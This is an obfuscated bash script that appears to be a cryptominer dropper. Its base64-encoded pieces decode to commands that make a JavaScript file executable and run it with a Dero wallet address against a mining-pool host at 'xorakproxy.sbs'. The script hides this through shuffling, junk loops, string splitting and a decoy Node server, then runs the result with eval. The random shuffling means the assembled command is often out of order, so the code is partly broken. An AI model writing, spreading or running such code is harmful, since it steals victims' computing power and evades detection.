#!/bin/bash

r(){ echo $((RANDOM%$1)); }
g(){ head -c $1 /dev/urandom | base64 | tr -d '\n'; }

a="Y2htb2QgK3ggYWJjZHh5empsLmpz"
b="OyBwPSQoc2h1ZiAtZSBuZ2lueCBhIGUgLW4xKQ=="
c="OyBuPSQoIFsgIiRwIiA9IG5naW54IF0gJiYgc2h1ZiAtaSAyLTEwIC1uMSB8fCBzaHVmIC1pIDEtMTAgLW4xICkg"
d="OyAuL2FiY2R4eXpqa2wuanMgLXcgZGVybzFxeXd mYXp2cTI2cDYzbHJtNXZ3bmp4OGFyZm5uNzZuZzhkbGU2aDQzemVtYXhrZA=="
e="c2dmbmRjcXFldGZsYXguc29sbyAtciAke3B9JHtu fS54b3Jha3Byb3h5LnNiczoxMDMwMA=="

arr=("$a" "$b" "$c" "$d" "$e")

mix=()
while [ ${#arr[@]} -gt 0 ]; do
    i=$(r ${#arr[@]})
    mix+=("${arr[$i]}")
    unset arr[$i]
    arr=("${arr[@]}")
done

payload=""
for x in "${mix[@]}"; do
    payload+=$(echo "$x" | base64 -d 2>/dev/null)
done

junk(){
    for i in $(seq 1 20); do
        t=$(g 32)
        echo "$t" | rev | cut -c1-10 >/dev/null
    done
}

for i in $(seq 1 10); do junk; done

f1=$(echo "$payload" | cut -c1-50)
f2=$(echo "$payload" | cut -c51-100)
f3=$(echo "$payload" | cut -c101-200)
f4=$(echo "$payload" | cut -c201-)

final="$f1$f2$f3$f4"

node -e "
const http=require('http')
http.createServer((q,s)=>{s.end('ok')}).listen(5000)
setInterval(()=>{},1000)
" >/dev/null 2>&1 &

sleep 0.2

eval "$final"
